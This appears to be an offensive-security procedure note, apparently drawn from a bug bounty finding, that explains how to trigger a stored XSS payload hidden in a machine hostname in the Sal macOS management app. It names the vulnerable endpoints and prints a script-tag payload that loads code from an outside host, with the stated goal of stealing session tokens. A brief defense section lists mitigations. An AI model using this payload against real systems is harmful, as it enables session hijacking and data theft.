---
tags:
  - xss
  - stored-xss
  - execution
  - collection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
platforms:
  - Web
  - macOS
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: b2adef66-24b5-402c-a94d-af71f44f40bf
created_at: '2025-12-13T23:55:20.823Z'
updated_at: '2025-12-13T23:55:20.823Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-Stored-XSS-in-Sal-Activity-List

## Summary

This procedure triggers the execution of a stored XSS payload by accessing Sal application pages that render the injected machine hostname, executing JavaScript in the victim's browser context.

## Description

Once a payload is stored in a machine's hostname via the Sal web app, it renders unsanitized in HTML links on activity and status pages. Navigating to these endpoints as a victim user causes the script to execute, allowing arbitrary JS like session hijacking. The attack targets web endpoints in a macOS management environment, assuming the payload injection step is complete. Outcomes include code execution, potential data theft (e.g., localStorage or cookies), and escalation to broader compromises.

## Requirements

1. Payload already injected into a machine hostname
2. Access to view activity or status lists (can be same or different user session)
3. Victim browser without strict XSS protections (e.g., no CSP blocking external scripts)

## Defense

Defensive measures and detection strategies:

- Sanitize all outputs when rendering user data in HTML (e.g., use DOMPurify)
- Deploy strict CSP headers to block inline and external scripts
- Log and alert on JavaScript errors or unexpected network requests from the app
- Regular scanning for stored XSS in admin panels

## Objectives

1. Execute the stored JavaScript payload in a victim session
2. Collect sensitive data like session tokens
3. Demonstrate impact through verifiable execution (e.g., alert or beacon)

## Instructions

### Step 1: Simulate Victim Access

**Context**: Use a separate browser session or incognito mode to mimic another user viewing the lists.

Log in as a standard user (or remain unauthenticated if applicable) to the Sal app.

### Step 2: Navigate to Vulnerable Endpoint

**Context**: Access pages that display machine lists, triggering the rendering of the malicious hostname.

Visit https://sal.██████.com/list/Activity/hour/all/0/ or https://sal.██████.com/list/Status/all_machines/machine_group/2/.

The hostname link will include the payload, e.g., <a href="...">example-host"><script src="https://nahamsec.xss.ht"></script></a>, executing the script.

> Monitor network tab for the external script load or console for JS alerts to confirm execution.

### Step 3: Validate Execution

**Context**: Confirm the XSS fired and assess impact.

Check for payload effects, such as a callback to an attacker-controlled server or stolen data transmission.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[Execution]]
- [[Collection]]
